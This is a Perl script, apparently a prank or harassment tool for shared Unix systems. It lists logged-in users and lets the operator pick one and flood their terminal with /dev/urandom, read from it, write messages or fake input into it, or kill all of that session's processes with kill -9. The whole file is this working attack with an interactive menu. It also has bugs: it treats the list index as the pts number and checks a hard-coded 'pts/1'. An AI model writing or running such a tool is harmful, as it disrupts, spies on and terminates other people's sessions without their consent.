#!/usr/bin/perl
#use strict;
#use warnings;
use File::Copy;

my @users = qx(who);
my @targets;
#because the user may be logged in more than once, we will split the arrays into seperate lists rather than hashes
foreach my $item (@users) {
  @temp = split / /, $item;
  foreach my $user_and_pty (@temp) {
    if($user_and_pty =~ "^[a-zA-Z]"){
    push (@targets,$user_and_pty);
    }
  }
}
my @user_list;
my @term_list;
foreach my $item (@targets) {
  if($item =~ "pts") {
  push(@term_list, $item);
  } else {
    push (@user_list, $item);
    }
}

my $size = @user_list;
my $i = 0;

print "users | tty\n";
print "-----------\n";
while ($i < $size) {
	print "$i: @user_list[$i]    @term_list[$i]\n";
	$i++;
}

print "\nenter a target number\n";
my $target_num = <>;
chomp $target_num;
if($target_num > $i - 1){
  print "invalid number\n";
}

print "action required\n";

print "Enter 1 for fuzzing there session\n";
print "Enter 2 for freezing there session\n";
print "Enter 3 to send a msg to there term\n";
print "Enter 4 to type to there command line\n";
print "Enter 5 to kill a session\n";


my $sel = <>;
chomp $sel;

if ($sel ne "1" && $sel ne "2" && $sel ne "3" && $sel ne "4" && $sel ne "5") {
	exit (0);
}

print "terminal is pts $target_num\n";
if($sel == "1"){
	print "fuzzing /dev/pts/$target_num\n";
	print "press CTRL+C to stop\n";
	copy("/dev/urandom", "/dev/pts/$target_num") or die "cannot fuzz\n";

}

if($sel == "2"){
	print "freezing /dev/pts/$target_num\n";
	print "press CTRL+C to stop\n";
	my $file = "/dev/pts/$target_num";
	open(my $fh, '<', $file) or die "could not open tty\n";
	while (my $line = <$fh>) {
		print $line. "\n";
	}
}


if($sel == "3"){
	print "starting message sending to /dev/pts/$target_num\n";
	print "type a . on a newline or press CTRL+C to stop\n";

	my $file = "/dev/pts/$target_num";
	open(my $fh, ">>", $file) or die "could not open tty\n";
	
	while (1) {
	my $writing = <>;
	chomp $writing;
	if ($writing eq ".") {
			close $fh or print "cannot close file handle\n";
			exit 0;
		}
		print $fh $writing, "\n" or die "couldnt write\n";
		}

		}


if($sel == "4"){
	print "starting message sending to /dev/pts/$target_num\n";
	print "type a . on a newline or press CTRL+C to stop\n";

	my $file = "/dev/pts/$target_num";
	open(my $fh, ">>", $file) or die "could not open tty\n";
	
	while (1) {
	my $writing = <>;
	chomp $writing;
	if ($writing eq ".") {
			close $fh or print "cannot close file handle\n";
			exit 0;
		}
		print $fh $writing or die "couldnt write\n";
		}

		}


if($sel eq "5"){
  print "soft or hard kill?\n";
  print "enter [soft] or [hard]\n";
  my $kill_choice = <>;
  chomp $kill_choice;
  if($kill_choice ne "soft" && $kill_choice ne "hard") {
    exit(0);
  }
  print "killing user session\n\n";
  my $command = "ps -aux|egrep -vi \"grep\" | egrep \"pts/$target_num\" | awk '{print \$2}'";
  my @pids = qx($command);
  foreach (@pids) {
    chomp $_;
    my $xx = qx(ps $_);
    print "Killing: $xx \n";
    #hard kill
    if($kill_choice eq "soft"){
      print "soft kill\n";
      system("kill -15 $_");
      print "----------\n";
    } 
    if($kill_choice eq "hard"){
      print "hard kill\n";
      system("kill -9 $_");
      print "----------\n";
    }
  my $result = qx(who | grep "pts/1" && echo "user still exists" || echo "user gone");
  print $result, "\n";
  }
}

